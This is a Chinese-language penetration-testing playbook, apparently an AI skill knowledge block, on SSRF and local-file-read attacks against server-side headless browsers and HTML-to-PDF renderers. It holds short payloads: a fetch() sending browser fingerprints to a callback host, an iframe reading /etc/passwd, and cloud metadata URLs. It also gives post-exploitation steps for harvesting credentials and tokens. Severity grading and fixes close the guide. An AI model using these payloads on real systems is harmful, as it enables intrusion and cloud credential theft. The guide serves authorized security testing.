# 三、服务端无头浏览器渲染专项（截图 / 快照 / HTML→PDF / 链接预览）

> 来源：CkSKILLS v1 `ssrf-internal-network` §三、服务端无头浏览器渲染专项（截图 / 快照 / HTML→PDF / 链接预览）（迁移至 v2 知识块）

> 攻击面公式：**用户可控 URL/HTML × 服务端真浏览器打开 × 渲染进程有内网/云凭据**。命中入口先做本节，再回第一、二节打 SSRF/元数据。

### 3.1 入口与接口词表（攻击面发现）

| 维度 | 关键词 |
|---|---|
| 功能 | 网页截图、网页快照、长图/海报生成、页面存档、HTML 转 PDF/图片、导出 PDF、链接预览、分享卡片、网页监控、URL 检测/沙箱、JS 渲染采集 |
| 接口 | `screenshot` `snapshot` `capture` `preview` `thumbnail` `unfurl` `link-preview` `render` `print` `export` `pdf` `convert` `crawl` `scrape` `archive` |
| 参数 | `url` `link` `target` `uri` `href` `site` `page` `address` `source` `html` `content` |
| 子域/路径 | `shot` `capture` `preview` `pdf` `render` `snapshot` `screenshot` `export` `crawler` |
| 响应形态 | `image/png`、`image/jpeg`、`application/pdf`、异步任务 JSON（`task_id` 轮询/回调取图） |

- 从 JS/source map/依赖文件里顺带取 `playwright`/`puppeteer`/`chrome`/`wkhtmltopdf` 的版本与接口路径
- 渲染耗时、任务队列、`Content-Disposition: attachment` 都是这条攻击面的指纹

### 3.2 确认“后端是真浏览器”（3 分钟）

1. **抓取请求看 UA**：提交自控 URL，在自己的 HTTP 回调/日志看请求头。出现 `HeadlessChrome/<ver>`、`Chrome/<ver> (X11; Linux x86_64)`，或 Safari 形态却来自云 IP → 无头浏览器；只有普通 HTTP 客户端 UA → 按第一、二、四、五节打普通 SSRF。
2. **验证页面 JS 执行**：页面里 `fetch('https://<dnslog>/js?ua='+encodeURIComponent(navigator.userAgent))` 或 `new Image().src=...`；DNSLog/回调收到 = JS 已执行；只收到静态资源请求 = 仅抓取不渲染。
3. **截图/PDF 回读指纹**：页面把 `navigator.userAgent`、`navigator.userAgentData.brands`、`navigator.platform`、WebGL renderer 渲染成大字/页脚，让返回的截图/PDF 带出来 → 直接读内核与版本。
4. **内核判别**：Playwright WebKit 的 UA 伪装成 macOS Safari（`AppleWebKit/605.1.15 ... Version/17.x Safari/605.1.15`），但服务端在 Linux/云 IP；`HeadlessChrome` = Chromium/Puppeteer/Playwright Chromium；`wkhtmltopdf`/QtWebKit 常见于老 HTML→PDF。
5. **版本来源**：UA 精确版本；Playwright 版本与内置内核版本绑定，可从 `package.json`/报错页/source map/依赖泄露反查；错误页、静态资源路径、响应头可辅助。

> 现成检测页：`references/render-probe.html`（用法见 `references/README.md`）——提交时带 `?cb=<你的 HTTP 回调>`，大字回读 UA / 内核 / UA-CH，自动外带 JS 指纹，并内置 file:// 与云元数据探测；`?meta=0` 关元数据、`?file=0` 关 file 探测。

### 3.3 不用 exp 先打（低门槛，优先）

- **HTML→PDF/图片本地文件读取**：`<iframe src="file:///etc/passwd">`、`<object>`、内联 `file://` 图片；内容进 PDF/截图即证据
- **渲染器 SSRF/内网探测**：页面 JS 请求内网、云元数据、内网管理面板；CORS 读不到响应时用 `<img>`/`<script>`/DNS 重绑定/302/时序盲打；只回显截图时，把探测结果渲染成页面可见文字
- **云元数据盲打**：让页面/渲染器访问 `http://169.254.169.254/latest/meta-data/`、`http://100.100.100.200/latest/meta-data/`（读不到响应也要记录可达性）
- **抓取组件**：若抓取由 HTTP 客户端完成，按第一、二、四、五节打 SSRF/重定向/DNS 重绑定
- **老实现**：wkhtmltopdf/QtWebKit 的 SSRF、本地文件读取、命令注入类问题优先测

### 3.4 内核版本 → N-day 验证

- 有 UA/依赖版本 → 查公开 CVE 与可用 PoC；**没有可用 exp 不硬编**：按“组件版本过旧 + 可控渲染入口”出供应链/低危结论
- Chromium/V8 现代利用需 **内存漏洞 + V8 sandbox escape** 组合，公开 exp 通常只对特定版本区间有效，先核对 UA 与 PoC 支持版本
- WebKit：Playwright 内置 WebKit 与上游版本存在滞后，按 UA/特性判断后匹配 WebKit 公开 CVE
- 容器化 Playwright 常带 `--no-sandbox`：决定渲染器 RCE 是否直接落容器，按崩溃/回连行为判断
- **拿到执行后**：容器内看 `env`/凭据/`docker.sock`/挂载/内网 → 云元数据 → 按第二节取 STS，再走 `cloud-infra-supply-chain` 三、3.1 的实例角色/云助手横向

### 3.5 验证与定级

- 出网可达 = 信息级；读元数据/内网 = 严重（凭据可能接管云资产）
- 渲染器 RCE = 严重；仅版本过旧无利用 = 低危/供应链（写明入口、版本、升级建议）
- 报告写清：入口 URL/参数、回调/截图证据、内核与版本、利用链、影响范围、修复建议
- 修复：内核升级；URL/协议白名单（禁 `file://`、私网、元数据地址）；渲染容器独立网络且不绑云角色；渲染进程降权/沙箱
